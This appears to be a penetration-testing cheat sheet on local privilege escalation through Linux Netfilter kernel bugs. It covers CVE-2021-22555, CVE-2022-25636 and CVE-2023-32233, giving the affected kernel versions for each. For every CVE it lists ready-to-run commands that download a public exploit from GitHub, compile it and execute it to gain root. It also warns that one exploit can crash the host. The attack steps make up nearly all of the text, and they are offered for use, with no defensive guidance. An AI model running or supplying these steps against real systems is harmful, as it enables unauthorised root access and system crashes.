## Netfilter Kernel Exploits

Netfilter is the Linux kernel subsystem responsible for packet filtering, connection tracking, and NAT. It operates at a deep level of the network stack — vulnerabilities here allow unprivileged users to escalate directly to root.

Its three core functions:

1. **Packet defragmentation** — reassembles fragmented IP packets
2. **Connection tracking** — maintains state for active network connections
3. **Network address translation (NAT)** — rewrites packet source/destination addresses

All IP packets pass through Netfilter before reaching their target, making any exploitable flaw in this subsystem a high-impact kernel-level vulnerability.

### Check kernel version before proceeding

```shell
uname -r
```

---

### CVE-2021-22555

Affects kernel versions **2.6 through 5.11** — a heap out-of-bounds write in the `IPT_SO_SET_REPLACE` socket option handler.

```shell
wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
gcc -m32 -static exploit.c -o exploit
./exploit
```

---

### CVE-2022-25636

Affects kernel versions **5.4 through 5.6.10** — out-of-bounds read/write in the `nft_fwd_dup_netdev_offload` path.

> ⚠️ This exploit can corrupt kernel memory and crash the system — a reboot will be required to recover the host. Use with caution in production or shared environments.

```shell
git clone https://github.com/Bonfee/CVE-2022-25636.git
cd CVE-2022-25636
make
./exploit
```

---

### CVE-2023-32233

Affects kernel versions **up to 6.3.1** — use-after-free in Netfilter's `nf_tables` when handling batch requests.

```shell
git clone https://github.com/Liuk3r/CVE-2023-32233
cd CVE-2023-32233
gcc -Wall -o exploit exploit.c -lmnl -lnftnl
./exploit
```

> 💡 The `-lmnl` and `-lnftnl` flags link against `libmnl` and `libnftnl` — if compilation fails, install them first with `sudo apt install libmnl-dev libnftnl-dev`.
